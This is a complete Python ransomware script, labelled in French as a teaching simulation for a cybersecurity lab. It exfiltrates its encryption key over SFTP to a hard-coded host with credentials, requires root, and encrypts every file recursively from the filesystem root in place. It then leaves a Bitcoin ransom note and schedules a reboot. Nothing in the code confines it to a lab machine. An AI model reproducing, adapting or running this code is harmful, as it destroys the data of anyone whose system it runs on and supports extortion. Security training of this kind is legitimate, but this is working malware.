#script ransomware
# !/usr/bin/env python3
# ransomware_total.py - Simulation pédagogique de ransomware (TP cybersécurité)

import os
import sys
import logging
from pathlib import Path
from cryptography.fernet import Fernet
import paramiko
import socket
import time
import subprocess

# Configuration
SFTP_SERVER = "192.168.64.6"
SFTP_PORT = 22
SFTP_USER = "sftpuser"
SFTP_PASS = "kali"
SFTP_KEY_PATH = "/home/"
RANSOM_NOTE = "/root/README.txt"

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[logging.FileHandler("/tmp/ransomware.log"), logging.StreamHandler()]
)


class RansomwareSimulator:
    def __init__(self):
        self.key = None
        self.cipher = None
        self.encrypted_files = 0
        self.skipped_files = 0
        self.error_files = 0
        self.total_size = 0
        self.start_time = time.time()

    def generate_key(self):
        """Generate encryption key"""
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
        logging.info(f"Generated encryption key: {self.key.decode()[:10]}...")

    def exfiltrate_key(self):
        """Send key to attacker via SFTP"""
        try:
            hostname = socket.gethostname()
            key_filename = f"{hostname}_{int(time.time())}.key"

            transport = paramiko.Transport((SFTP_SERVER, SFTP_PORT))
            transport.connect(username=SFTP_USER, password=SFTP_PASS)
            sftp = paramiko.SFTPClient.from_transport(transport)

            remote_path = f"{SFTP_KEY_PATH}{key_filename}"
            with sftp.file(remote_path, 'w') as f:
                f.write(self.key)

            sftp.close()
            transport.close()
            logging.info(f"Key exfiltrated to {SFTP_SERVER}:{remote_path}")
            return True
        except Exception as e:
            logging.error(f"Key exfiltration failed: {str(e)}")
            return False

    def encrypt_file(self, filepath):
        """Encrypt a single file in-place"""
        try:
            # Skip special files
            if not filepath.is_file() or filepath.is_symlink():
                return False

            # Skip files that are too large (>100MB) for demo purposes
            file_size = filepath.stat().st_size
            if file_size > 100 * 1024 * 1024:  # 100MB
                self.skipped_files += 1
                return False

            # Read original content
            with open(filepath, 'rb') as f:
                original_data = f.read()

            # Encrypt and overwrite
            encrypted_data = self.cipher.encrypt(original_data)
            with open(filepath, 'wb') as f:
                f.write(encrypted_data)

            self.encrypted_files += 1
            self.total_size += file_size
            return True

        except Exception as e:
            self.error_files += 1
            logging.error(f"Error encrypting {filepath}: {str(e)}")
            return False

    def encrypt_filesystem(self, root_path="/"):
        """Recursively encrypt files starting from root_path"""
        logging.info(f"Starting filesystem encryption from {root_path}")

        for path in Path(root_path).rglob('*'):
            try:
                if path.is_dir():
                    continue

                self.encrypt_file(path)

                # Log progress every 100 files
                if self.encrypted_files % 100 == 0:
                    logging.info(
                        f"Progress: {self.encrypted_files} files encrypted, "
                        f"{self.skipped_files} skipped, {self.error_files} errors"
                    )

            except Exception as e:
                logging.error(f"Error processing {path}: {str(e)}")
                self.error_files += 1
                continue

    def leave_ransom_note(self):
        """Create a ransom note"""
        note_content = f"""ATTENTION!

Vos fichiers ont été chiffrés avec un algorithme militaire AES-256.
Pour récupérer vos données, vous devez payer une rançon de 0.001 BTC.

Envoyez un email à ransomware@example.com avec votre clé unique:
{self.key.decode()}

Vous avez 48 heures avant que la clé ne soit définitivement supprimée.
"""
        try:
            with open(RANSOM_NOTE, 'w') as f:
                f.write(note_content)
            logging.info(f"Ransom note left at {RANSOM_NOTE}")
        except Exception as e:
            logging.error(f"Failed to leave ransom note: {str(e)}")

    def reboot_system(self):
        """Schedule system reboot"""
        logging.info("Scheduling system reboot in 60 seconds...")
        try:
            subprocess.run(["shutdown", "-r", "+1"], check=True)
            logging.info("Reboot scheduled successfully")
        except subprocess.CalledProcessError as e:
            logging.error(f"Failed to schedule reboot: {str(e)}")

    def run(self):
        """Main execution flow"""
        if os.geteuid() != 0:
            logging.error("This script must be run as root!")
            sys.exit(1)

        logging.warning("=== STARTING RANSOMWARE SIMULATION ===")

        # Step 1: Generate encryption key
        self.generate_key()

        # Step 2: Exfiltrate key
        if not self.exfiltrate_key():
            logging.error("Key exfiltration failed - aborting!")
            sys.exit(1)

        # Step 3: Encrypt filesystem
        self.encrypt_filesystem()

        # Step 4: Leave ransom note
        self.leave_ransom_note()

        # Step 5: Reboot system
        self.reboot_system()

        # Final stats
        duration = time.time() - self.start_time
        logging.info(
            f"=== ENCRYPTION COMPLETE ==="
            f"\nFiles encrypted: {self.encrypted_files}"
            f"\nFiles skipped:   {self.skipped_files}"
            f"\nEncryption errors: {self.error_files}"
            f"\nTotal data processed: {self.total_size / (1024 * 1024):.2f} MB"
            f"\nDuration: {duration:.2f} seconds"
        )


if __name__ == "__main__":
    simulator = RansomwareSimulator()
    simulator.run()